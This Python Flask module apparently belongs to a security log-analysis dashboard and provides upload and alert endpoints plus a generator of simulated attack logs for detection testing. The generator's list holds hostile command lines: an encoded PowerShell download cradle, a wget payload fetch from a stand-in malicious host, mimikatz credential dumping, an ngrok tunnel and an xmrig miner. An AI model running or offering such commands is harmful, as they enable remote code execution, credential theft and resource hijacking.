"""
routes.py - Flask routes, WebSocket alert callback, and test log generator.
"""

import asyncio
import logging
import os
import random
import tempfile
import threading
import time
from datetime import datetime

from flask import request, jsonify, render_template
from flask_socketio import emit
from werkzeug.utils import secure_filename

from app.models import Alert

ALLOWED_EXTENSIONS = {'.log', '.txt', '.csv', '.evtx', '.out', ''}
MAX_UPLOAD_BYTES = 10 * 1024 * 1024  # 10 MB

logger = logging.getLogger(__name__)


def register_routes(app, socketio, analyzer):
    """Register all Flask routes and WebSocket handlers onto the app."""

    def alert_callback(alert: Alert):
        """Emit a new alert to all connected WebSocket clients."""
        socketio.emit('new_alert', {
            'id': alert.id,
            'timestamp': alert.timestamp.isoformat(),
            'rule_name': alert.rule_name,
            'category': alert.category.value,
            'severity': alert.severity.value,
            'source_ip': alert.source_ip,
            'confidence': alert.confidence,
            'mitre_technique': alert.mitre_technique,
            'ai_analysis': alert.ai_analysis,
            'recommended_action': alert.recommended_action,
            'raw_log': (alert.raw_log[:200] + '...') if len(alert.raw_log) > 200 else alert.raw_log
        })

    analyzer.register_alert_callback(alert_callback)

    @app.route('/')
    def index():
        return render_template('index.html')

    @app.route('/api/stats')
    def get_stats():
        return jsonify(analyzer.stats.get_stats())

    @app.route('/api/alerts')
    def get_alerts():
        limit = request.args.get('limit', 50, type=int)
        severity = request.args.get('severity')

        filtered = analyzer.alerts[-limit:]
        if severity:
            filtered = [a for a in filtered if a.severity.value == severity]

        return jsonify([{
            'id': a.id,
            'timestamp': a.timestamp.isoformat(),
            'rule_name': a.rule_name,
            'category': a.category.value,
            'severity': a.severity.value,
            'source_ip': a.source_ip,
            'confidence': a.confidence,
            'mitre_technique': a.mitre_technique,
            'ai_analysis': a.ai_analysis
        } for a in filtered])

    @app.route('/api/upload', methods=['POST'])
    def upload_log():
        """Accept a log file upload and scan every line for threats."""
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400

        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400

        ext = os.path.splitext(file.filename)[1].lower()
        if ext not in ALLOWED_EXTENSIONS:
            return jsonify({'error': f'Unsupported file type: {ext}'}), 400

        # Read file safely
        raw = file.read(MAX_UPLOAD_BYTES)
        try:
            content = raw.decode('utf-8', errors='replace')
        except Exception as e:
            return jsonify({'error': f'Could not decode file: {e}'}), 400

        lines = [l.strip() for l in content.splitlines() if l.strip()]
        if not lines:
            return jsonify({'error': 'File is empty or has no readable lines'}), 400

        # Run async analysis synchronously in a new event loop
        async def _scan():
            results = []
            for line in lines:
                alerts = await analyzer.analyze_line(line)
                for alert in alerts:
                    results.append({
                        'id': alert.id,
                        'timestamp': alert.timestamp.isoformat(),
                        'rule_id': alert.rule_id,
                        'rule_name': alert.rule_name,
                        'category': alert.category.value,
                        'severity': alert.severity.value,
                        'source_ip': alert.source_ip,
                        'confidence': round(alert.confidence, 3),
                        'mitre_technique': alert.mitre_technique,
                        'ai_analysis': alert.ai_analysis,
                        'recommended_action': alert.recommended_action,
                        'raw_log': alert.raw_log[:300]
                    })
            return results

        loop = asyncio.new_event_loop()
        try:
            scan_results = loop.run_until_complete(_scan())
        finally:
            loop.close()

        return jsonify({
            'filename': secure_filename(file.filename),
            'lines_scanned': len(lines),
            'alerts_found': len(scan_results),
            'alerts': scan_results
        })



def generate_test_logs(test_log: str):
    """Generate simulated security log entries for demonstration."""
    test_patterns = [
        "Failed password for root from 192.168.1.100 port 22",
        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
        "lsass.exe dumping credentials using comsvcs.dll",
        "ngrok tcp 3389 started",
        "wget http://malicious-site.com/payload.exe -O /tmp/payload",
        'schtasks /create /tn "Update" /tr "powershell -enc..." /sc minute /mo 5',
        "ssh failed password for invalid user admin from 10.0.0.50",
        'mimikatz.exe "sekurlsa::logonpasswords" exit',
        "cmd.exe /c powershell -windowstyle hidden -ep bypass",
        "SQLMap/1.0 - sqlmap.org",
        "frpc -c frpc.ini started",
        "xmrig --url pool.minexmr.com --user wallet_address",
    ]

    os.makedirs(os.path.dirname(test_log) if os.path.dirname(test_log) else '.', exist_ok=True)
    with open(test_log, 'w') as f:
        f.write("")

    while True:
        time.sleep(random.uniform(2, 8))
        with open(test_log, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"{timestamp} {random.choice(test_patterns)}\n")
            f.flush()


def run_analyzer(analyzer):
    """Resolve available log files and start the analyzer engine."""
    log_files = [
        '/var/log/syslog',
        '/var/log/auth.log',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/var/log/kern.log',
        r'C:\Windows\System32\winevt\Logs\Security.evtx',
        r'C:\Windows\System32\winevt\Logs\System.evtx',
    ]

    existing_logs = [f for f in log_files if os.path.exists(f) and not f.endswith('.evtx')]

    if not existing_logs:
        test_log = os.path.join(tempfile.gettempdir(), 'test_security.log')
        existing_logs = [test_log]
        logger.info(f"No system logs found. Creating test log at {test_log}")
        threading.Thread(target=generate_test_logs, args=(test_log,), daemon=True).start()

    asyncio.run(analyzer.start(existing_logs))
